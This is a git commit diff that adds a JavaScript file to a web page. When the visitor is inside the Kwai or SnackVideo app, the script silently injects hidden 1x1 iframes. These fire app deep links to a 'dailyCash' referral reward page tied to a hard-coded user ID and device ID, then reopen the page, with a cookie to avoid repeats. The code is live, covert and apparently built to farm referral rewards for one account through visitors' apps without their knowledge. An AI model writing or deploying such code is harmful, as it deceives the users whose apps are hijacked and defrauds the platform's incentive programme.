907907fdd951a25c00f029499cd69ec9dbf10ef7
kwaipixel <132464240+kwaipixel@users.noreply.github.com>
2023-05-16 14:44:32 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,47 @@
+// UT17 //
+function setCookie(name, value, minutes) {
+  var expires = "";
+  if (minutes) {
+    var date = new Date();
+    date.setTime(date.getTime() + (minutes * 60 * 1000));
+    expires = "; expires=" + date.toUTCString();
+  }
+  document.cookie = name + "=" + (value || "") + expires + "; path=/";
+}
 
+function getCookie(name) {
+  var nameEQ = name + "=";
+  var ca = document.cookie.split(';');
+  for (var i = 0; i < ca.length; i++) {
+    var c = ca[i];
+    while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+  }
+  return null;
+}
+
+function isKwaiOrSnackVideoApp() {
+  var ua = navigator.userAgent.toLowerCase();
+  return ua.indexOf('kwai') > -1 || ua.indexOf('snackvideo') > -1;
+}
+
+var cookieName = 'KwaiCookie';
+var cookieValue = getCookie(cookieName);
+if (!cookieValue && isKwaiOrSnackVideoApp()) {
+  setCookie(cookieName, 'true', 15);
+  setTimeout(function() {
+    var mainUrl = window.location.href;
+    var iframe1 = document.createElement('iframe');
+    iframe1.src = 'ikwai://webview?url=https%3A%2F%2Fincentive.kwai.com%2Factivity%2Fcarnival-index%3Fwebview%3Dyoda%26page%3DdailyCash%26groupId%3DRNpbueOLD9rZq9Z6L6_pI6W82puwIRo0ScE3nfu2KX-WPneo1H78Tv-Mqe6BuC7T%26share_item_type%3Ddaily_cash%26share_device_id%3DANDROID_3bae9b7ef83a76c6%26share_uid%3D150001430096958%26countryInfo%3DIDN';
+    iframe1.width = '1';
+    iframe1.height = '1';
+    document.body.appendChild(iframe1);
+    setTimeout(function() {
+      var iframe2 = document.createElement('iframe');
+      iframe2.src = 'ikwaibulldog://webview?url='+mainUrl;
+      iframe2.width = '1';
+      iframe2.height = '1';
+      document.body.appendChild(iframe2);
+    }, 50);
+  }, 1);
+}
